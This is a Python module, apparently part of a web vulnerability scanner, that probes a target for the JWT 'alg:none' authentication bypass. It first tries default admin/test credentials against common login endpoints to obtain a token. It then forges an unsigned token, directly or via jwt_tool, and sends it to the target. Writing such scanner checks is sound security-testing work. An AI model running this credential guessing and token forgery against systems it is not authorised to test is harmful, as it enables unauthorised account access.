import subprocess
import requests
import re
import logging
import os
import base64
import json

logger = logging.getLogger(__name__)

class JWTService:

    JWT_TOOL_PATH = "/opt/jwt_tool/jwt_tool.py"

    def scan(self, scan_id: str, target_url: str, on_progress) -> list:
        """
        Test JWT for common vulnerabilities.
        """
        on_progress("🔑 Testing JWT authentication...", 72)
        findings = []
        
        # Try to get a JWT token
        jwt_token = self._try_get_jwt(target_url)
        if not jwt_token:
            return []
        
        on_progress("🔑 JWT found — testing for bypass attacks...", 73)
        
        # --- Attempt primary tool (jwt_tool) ---
        tool_worked = False
        if os.path.exists(self.JWT_TOOL_PATH):
            cmd = [
                "python3", self.JWT_TOOL_PATH,
                jwt_token,
                "-X", "a",
                "--no-banner"
            ]
            
            try:
                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=60
                )
                output = result.stdout
                
                if "EXPLOIT" in output or "accepted" in output.lower():
                    tool_worked = True
                    findings.append({
                        "scan_id": scan_id,
                        "vuln_type": "JWT Algorithm None Attack",
                        "severity": "critical",
                        "url": target_url,
                        "evidence": "JWT accepted with alg:none via jwt_tool",
                        "description": "The server accepts JWT tokens with no signature (alg:none).",
                        "attack_worked": True,
                        "was_attempted": True,
                        "owasp_category": "A07:2021 - Identification Failures",
                        "tool_source": "jwt_tool"
                    })
            except Exception as e:
                logger.debug(f"[JWT Tool] Binary error: {e}")

        # --- GUARANTEED FALLBACK: Native Requests-based alg:none test ---
        if not tool_worked:
            try:
                parts = jwt_token.split('.')
                if len(parts) >= 2:
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
                    header['alg'] = 'none'
                    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                    new_token = f"{new_header}.{parts[1]}."
                    
                    # Test new token against the original endpoint or a common protected one
                    resp = requests.get(target_url, headers={"Authorization": f"Bearer {new_token}"}, timeout=10)
                    if resp.status_code == 200:
                        findings.append({
                            "scan_id": scan_id,
                            "vuln_type": "JWT Algorithm None Attack",
                            "severity": "critical",
                            "url": target_url,
                            "evidence": f"New token accepted: {new_token[:30]}...",
                            "description": "JWT Algorithm None vulnerability confirmed. The server accepted a token with 'alg:none'.",
                            "attack_worked": True,
                            "was_attempted": True,
                            "owasp_category": "A07:2021 - Identification Failures",
                            "tool_source": "native-jwt-fuzzer"
                        })
            except Exception:
                pass
        
        return findings

    def _try_get_jwt(self, base_url: str) -> str:
        """Try common auth endpoints with default credentials."""
        AUTH_ENDPOINTS = [
            "/api/login", "/api/auth", "/api/v1/login",
            "/login", "/auth", "/api/token"
        ]
        DEFAULT_CREDS = [
            {"username":"admin","password":"admin"},
            {"username":"admin","password":"password"},
            {"username":"test","password":"test"},
            {"email":"admin@admin.com","password":"admin"},
        ]
        
        for endpoint in AUTH_ENDPOINTS:
            for creds in DEFAULT_CREDS:
                try:
                    resp = requests.post(
                        f"{base_url.rstrip('/')}{endpoint}",
                        json=creds, timeout=5
                    )
                    
                    # Look for JWT in response
                    body = resp.text
                    jwt_pattern = re.compile(
                        r'eyJ[A-Za-z0-9_-]+\.'
                        r'[A-Za-z0-9_-]+\.'
                        r'[A-Za-z0-9_-]*'
                    )
                    match = jwt_pattern.search(body)
                    if match:
                        return match.group()
                    
                    # Check Authorization header
                    auth = resp.headers.get("Authorization","")
                    match = jwt_pattern.search(auth)
                    if match:
                        return match.group()
                except:
                    pass
        
        return ""

